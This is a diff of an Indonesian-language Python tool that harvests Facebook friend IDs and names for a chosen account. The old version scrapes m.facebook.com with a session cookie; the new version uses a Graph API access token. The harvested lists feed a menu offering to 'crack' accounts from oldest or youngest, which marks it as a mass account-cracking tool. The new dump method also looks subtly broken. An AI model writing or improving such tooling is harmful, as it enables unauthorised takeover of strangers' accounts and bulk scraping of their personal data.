@@ -199,46 +199,33 @@ def daftar_menu():
             uagent()
     else:
             Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);daftar_menu()
-### DUMP ###
+    
 class dump:
-
     def __init__(self) -> None:
         pass
-    def publik(self, userid, cookie, unit_cursor):
+    def publik():
+        win = '# DUMP ID PUBLIK'
+        win2 = mark(win, style='cyan')
+        sol().print(win2)
+        print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
+        pil = input(x+'['+p+'f'+x+'] Masukkan ID Facebook : ')
         try:
-            with requests.Session() as r:
-                r.headers.update({
-                    'upgrade-insecure-requests': '1',
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                    'host': 'm.facebook.com',
-                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4[FB_IAB/FB4A;FBAV/375.1.0.28.111:]',
-                    'accept-language': 'id,en;q=0.9',
-                })
-                r.cookies.update({
-                    'cookie': cookie
-                })
-                response = r.get('https://m.facebook.com/profile.php?id={}&v=friends&unit_cursor={}'.format(userid, unit_cursor)).text
-                self.all_friends = re.findall('href="fb://profile/(.*?)">(.*?)<', str(response))
-                for z in self.all_friends:
-                    self.id_friends, self.name = z[0], z[1].lower()
-                    if len(self.name) == 0 or len(self.name) > 100:
-                        continue
-                    else:
-                        if str(self.id_friends) in str(Dump):
-                            continue
-                        else:
-                            Console().print(f"[bold hot_pink2]   ╰─>[bold green] Dump {self.id_friends}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
-                            Dump.append(f'{self.id_friends}|{self.name}')
-                if 'Sorry, something went wrong.' in str(response):
-                    return 0
-                elif 'unit_cursor=' in str(response):
-                    self.unit_cursor = re.search('unit_cursor=(.*?)&', str(response)).group(1)
-                    self.publik(userid, cookie, self.unit_cursor)
-                else:
-                    return 0
-        except (KeyboardInterrupt):
-            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
-            return 3
+            koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
+            for pi in koh2['friends']['data']:
+                try:id.append(pi['id']+'|'+pi['name'])
+                except:continue
+                print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
+                setting()
+        except requests.exceptions.ConnectionError:
+            li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
+            lo = mark(li, style='red')
+            sol().print(lo, style='cyan')
+            exit()
+        except (KeyError,IOError):
+            teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
+            teks2 = mark(teks, style='red')
+            sol().print(teks2)
+            exit()
     ### DUMP PENGIKUT ###
     def pengikut(self, userid, cookie, token_eaag):
         try:
@@ -295,7 +282,7 @@ class dump:
         except (KeyboardInterrupt):
             Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
             return 2
-#def setting():
+def setting():
         wl = '# SETTING URUTAN ID'
         sol().print(mark(wl, style='cyan'))
         teks = '[01] Crack Dari Akun Tertua [mayan]\n[02] Crack Dari Akun Termuda [Mantap]'
